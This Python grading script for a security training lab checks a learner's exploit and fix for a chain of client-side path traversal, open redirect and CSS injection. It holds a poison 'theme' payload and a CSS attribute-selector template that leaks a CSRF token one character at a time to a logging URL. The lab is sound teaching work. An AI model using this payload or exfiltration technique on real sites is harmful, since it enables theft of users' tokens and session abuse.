#!/usr/bin/env python3
"""Verifier otomatis 2 fase untuk Lab 13.

Rantai: CSPT via stylesheet loader -> open redirect -> CSS injection,
ala Medi "Practical Client Side Path Traversal Attacks" (Acronis,
HackerOne #1245165, 2022).

  1. CSPT: GET /?theme=X (butuh login) me-render
         <link rel="stylesheet" href="/static/theme.X.css">
     dengan X direfleksikan tanpa sanitasi. Racun
     theme=/../../api/authorize?state=<css-penyerang>&x= membuat browser
     menghitung /static/theme./../../api/authorize?state=...&x=.css ->
     dinormalisasi menjadi /api/authorize?state=<css-penyerang>.
  2. Open redirect: /api/authorize?state=X -> 302 ke X (gadget; tidak
     eksploitable sendirian).
  3. CSS injection: browser memuat & menerapkan CSS penyerang; halaman
     memuat <input type="hidden" name="csrf_token" value="..."> yang dicuri
     via attribute selector TANPA JavaScript:
         input[name=csrf_token][value^="<prefix><c>"]{background:url(.../log?c=<c>)}
     satu karakter bocor per putaran (protokol adaptif).

"Browser korban" disimulasikan Python secara setia: fetch halaman, ekstrak
<link>, resolusi URL + normalisasi dot-segment ala WHATWG, ikuti redirect
302 saat memuat stylesheet. Pencocokan selector CSS diimplementasikan
untuk pola terdokumentasi lab ini (perilaku observable-nya identik dengan
browser: URL yang cocok di-request).

Hanya memakai Python stdlib (tanpa dependency), butuh `docker compose`
di host.

Alur:
  FASE 1 (pristine): bangun lab dari definisi rentan, pastikan
      - GET / tanpa sesi -> 401
      - POST /login (victim/victim123) -> 200 + cookie session
      - GET /?theme=light -> 200, ada <link> & input csrf_token
      - GET /static/theme.light.css -> 200 text/css
      - GET /api/authorize?state=http://example.com/x -> 302 (gadget)
      - serangan referensi (health): solutions/exploit.py -> EXFILTRATED
        == token rahasia
      - exploit/exploit.py milik learner dijalankan -> mencetak
        VICTIM_THEME: ..., STATUS: 200, LOADED_CSS: ..., EXFILTRATED: ...;
        EXFILTRATED harus == token rahasia
  FASE 2 (dengan fix/): bangun ulang app dari fix/app, pastikan
      - GET /?theme=<racun> -> 400 (gerbang fix)
      - rantai korban putus: tidak ada CSS penyerang yang dimuat
      - fungsi normal utuh -> /?theme=light, theme.light.css,
        open redirect tetap 302 (gadget, bukan yang di-fix)

Deteksi scaffold (tanpa string TODO di file learner):
  - exploit: skrip scaffold me-raise NotImplementedError -> exit 3.
  - fix: isi fix/app/app.py identik byte-per-byte dengan app/app.py -> exit 2.

Exit code: 0 = kedua fase lulus, 1 = gagal, 2 = fase 2 belum dikerjakan,
           3 = fase 1 belum dikerjakan (exploit.py belum ada/belum diisi).
"""
import filecmp
import os
import re
import shutil
import subprocess
import sys
import time
from http.client import HTTPConnection
from urllib.parse import quote, urlsplit, urljoin

LAB_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
SECRET = "k7x2m9pq"
VALID_THEME = "light"
POISON_THEME = "/../../api/authorize?state=http://127.0.0.1:9/core.css&x="
PASS, FAIL = "LULUS", "GAGAL"
results = []


def log(msg):
    print(msg, flush=True)


def check(name, ok, detail=""):
    results.append((name, ok))
    log("  [%s] %s%s" % (PASS if ok else FAIL, name, " -- " + detail if detail else ""))
    return ok


def run_compose(args):
    cmd = ["docker", "compose"] + args
    p = subprocess.run(cmd, cwd=LAB_DIR, capture_output=True, text=True, timeout=600)
    if p.returncode != 0:
        log("perintah gagal: %s\n%s" % (" ".join(cmd), p.stderr[-2000:]))
        sys.exit(1)
    return p


def req_full(url, headers=None, timeout=10):
    u = urlsplit(url)
    c = HTTPConnection(u.hostname, u.port or 80, timeout=timeout)
    try:
        path = u.path + ("?" + u.query if u.query else "")
        c.request("GET", path or "/", headers=headers or {})
        r = c.getresponse()
        h = {}
        for k, v in r.getheaders():
            h[k.lower()] = v
        return r.status, r.read(), h
    finally:
        c.close()


def req(path, headers=None):
    return req_full("http://%s:%d%s" % (HOST, PORT, path), headers=headers)


def login():
    c = HTTPConnection(HOST, PORT, timeout=10)
    try:
        import json
        c.request("POST", "/login",
                  body=json.dumps({"username": "victim", "password": "victim123"}),
                  headers={"Content-Type": "application/json"})
        r = c.getresponse()
        r.read()
        cookie = ""
        for k, v in r.getheaders():
            if k.lower() == "set-cookie":
                name, _, val = v.split(";", 1)[0].partition("=")
                if name.strip() == "session":
                    cookie = val.strip()
        return r.status, cookie
    finally:
        c.close()


def normalize_path(path):
    """Normalisasi dot-segment ala browser (WHATWG URL)."""
    segs = []
    for seg in path.split("/"):
        if seg in ("", "."):
            continue
        if seg == "..":
            if segs:
                segs.pop()
            continue
        segs.append(seg)
    return "/" + "/".join(segs)


def resolve_href(href):
    """Resolusi URL stylesheet oleh browser: pisahkan query, normalisasi path."""
    path_part, _, query = href.partition("?")
    url = normalize_path(path_part)
    return url + ("?" + query if query else "")


def victim_chain(theme, cookie):
    """Simulasi browser korban memuat stylesheet.
    -> (url_css_final, isi_css) atau (None, None) bila rantai putus."""
    st, body, _ = req("/?theme=" + quote(theme, safe=""),
                      headers={"Cookie": "session=" + cookie})
    if st != 200:
        return None, None
    m = re.search(r'<link rel="stylesheet" href="([^"]+)">', body.decode())
    if not m:
        return None, None
    url = urljoin("http://%s:%d/" % (HOST, PORT), resolve_href(m.group(1)))
    for _ in range(4):
        try:
            st, body, h = req_full(url, headers={"Cookie": "session=" + cookie})
        except OSError:
            return None, None
        if st in (301, 302, 303, 307, 308) and h.get("location"):
            url = urljoin(url, h["location"])
            continue
        if st == 200:
            return url, body.decode()
        return None, None
    return None, None


def reference_attack():
    """Serangan referensi (health check): jalankan solutions/exploit.py."""
    exp = os.path.join(LAB_DIR, "solutions", "exploit.py")
    p = subprocess.run([sys.executable, exp], capture_output=True,
                       text=True, timeout=120, cwd=os.path.dirname(exp))
    return p.returncode, p.stdout or "", p.stderr or ""


def parse_exploit_output(out):
    m_theme = re.search(r"^VICTIM_THEME:\s*(\S+)\s*$", out, re.MULTILINE)
    m_status = re.search(r"^STATUS:\s*(\d{3})\s*$", out, re.MULTILINE)
    m_css = re.search(r"^LOADED_CSS:\s*(\S+)\s*$", out, re.MULTILINE)
    m_exf = re.search(r"^EXFILTRATED:\s*(\S+)\s*$", out, re.MULTILINE)
    return ((m_theme.group(1) if m_theme else None),
            (m_status.group(1) if m_status else None),
            (m_css.group(1) if m_css else None),
            (m_exf.group(1) if m_exf else None))


def wait_up(timeout=150):
    log("menunggu lab siap di %s:%d ..." % (HOST, PORT))
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            st, body, _ = req("/login")
            if st == 200 and b"Login" in body:
                return True
        except OSError:
            pass
        time.sleep(2)
    return False


def compose_down():
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "down", "--remove-orphans"])


def main():
    if shutil.which("docker") is None:
        log("docker tidak ditemukan di PATH. Install Docker dulu lalu jalankan lagi.")
        sys.exit(1)

    log("== bersih-bersih container lama ==")
    compose_down()

    # ---------------- FASE 1 ----------------
    log("== FASE 1: membangun lab PRISTINE (rentan) ==")
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, _, _ = req("/")
    check("baseline GET / tanpa sesi -> 401", st == 401, "dapat %s" % st)

    st, cookie = login()
    check("fungsi normal: POST /login -> 200 + cookie", st == 200 and cookie,
          "dapat %s" % st)

    st, body, _ = req("/?theme=" + VALID_THEME,
                      headers={"Cookie": "session=" + cookie})
    ok = (st == 200 and b"/static/theme.light.css" in body
          and b'name="csrf_token"' in body)
    check("fungsi normal: GET /?theme=light -> 200 (+link & secret)",
          ok, "dapat %s" % st)

    st, body, h = req("/static/theme.light.css")
    check("fungsi normal: GET /static/theme.light.css -> 200 css",
          st == 200 and b"background" in body, "dapat %s" % st)

    st, _, h = req("/api/authorize?state=http://example.com/x")
    check("gadget: /api/authorize?state=... -> 302 open redirect",
          st == 302 and h.get("location") == "http://example.com/x",
          "dapat %s loc=%r" % (st, h.get("location")))

    log("== [HEALTH] serangan referensi: CSPT -> redirect -> CSS injection ==")
    rc, out, err = reference_attack()
    theme, status, css_url, exf = parse_exploit_output(out)
    check("serangan referensi: EXFILTRATED == token rahasia",
          rc == 0 and exf == SECRET,
          "dapat rc=%s exfiltrated_cocok=%s" % (rc, exf == SECRET))
    check("serangan referensi: LOADED_CSS menunjuk CSS penyerang",
          bool(css_url) and css_url.endswith("/core.css"),
          "dapat %r" % (css_url[:40] + "..." if css_url else css_url))
    if not (rc == 0 and exf == SECRET):
        log("LAB RUSAK: serangan referensi gagal di definisi pristine.")
        log("stderr: %s" % (err[-1500:] if err else "-"))
        compose_down()
        sys.exit(1)

    log("== FASE 1: reset ke pristine segar untuk exploit learner ==")
    compose_down()
    run_compose(["up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    log("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    exp = os.path.join(LAB_DIR, "exploit", "exploit.py")
    try:
        p = subprocess.run([sys.executable, exp], capture_output=True,
                           text=True, timeout=120, cwd=os.path.dirname(exp))
    except subprocess.TimeoutExpired:
        log("exploit.py melebihi 120 detik.")
        compose_down()
        sys.exit(1)
    if "NotImplementedError" in (p.stderr or ""):
        log("exploit.py masih scaffold (NotImplementedError). Kerjakan fase 1 dulu.")
        compose_down()
        sys.exit(3)
    theme, status, css_url, exf = parse_exploit_output(p.stdout or "")
    check("exploit mencetak VICTIM_THEME", bool(theme), "dapat %r" % theme)
    check("exploit mencetak STATUS: 200", status == "200", "dapat %r" % status)
    check("exploit mencetak LOADED_CSS: .../core.css",
          bool(css_url) and css_url.endswith("/core.css"), "dapat %r" % css_url)
    check("exploit mencetak EXFILTRATED == token rahasia", exf == SECRET,
          "dapat cocok=%s" % (exf == SECRET))

    compose_down()

    # ---------------- FASE 2 ----------------
    log("== FASE 2: cek scaffold fix ==")
    pristine = os.path.join(LAB_DIR, "app", "app.py")
    fixed = os.path.join(LAB_DIR, "fix", "app", "app.py")
    if filecmp.cmp(pristine, fixed, shallow=False):
        log("fix/app/app.py masih identik dengan pristine. Kerjakan fase 2 dulu.")
        sys.exit(2)

    log("== FASE 2: membangun lab dengan FIX ==")
    run_compose(["-f", "docker-compose.yml", "-f", "docker-compose.fix.yml",
                 "up", "-d", "--build"])
    if not wait_up():
        log("lab tidak siap (timeout).")
        sys.exit(1)

    st, _, _ = req("/?theme=" + quote(POISON_THEME, safe=""),
                   headers={"Cookie": "session=" + login()[1]})
    check("serangan referensi GAGAL: GET /?theme=<racun> -> 400",
          st == 400, "dapat %s" % st)

    _, cookie2 = login()
    css_url2, _ = victim_chain(POISON_THEME, cookie2)
    check("serangan referensi GAGAL: tidak ada CSS penyerang yang dimuat",
          css_url2 is None, "dapat %r" % css_url2)

    st, body, _ = req("/?theme=" + VALID_THEME,
                      headers={"Cookie": "session=" + cookie2})
    check("fungsi normal: GET /?theme=light -> 200",
          st == 200 and b"/static/theme.light.css" in body, "dapat %s" % st)
    st, _, _ = req("/static/theme.light.css")
    check("fungsi normal: GET /static/theme.light.css -> 200", st == 200,
          "dapat %s" % st)
    st, _, h = req("/api/authorize?state=http://example.com/x")
    check("gadget tetap: open redirect -> 302 (bukan yang di-fix)",
          st == 302, "dapat %s" % st)

    compose_down()

    failed = [n for (n, ok) in results if not ok]
    log("== HASIL: %d/%d cek lulus ==" % (len(results) - len(failed), len(results)))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
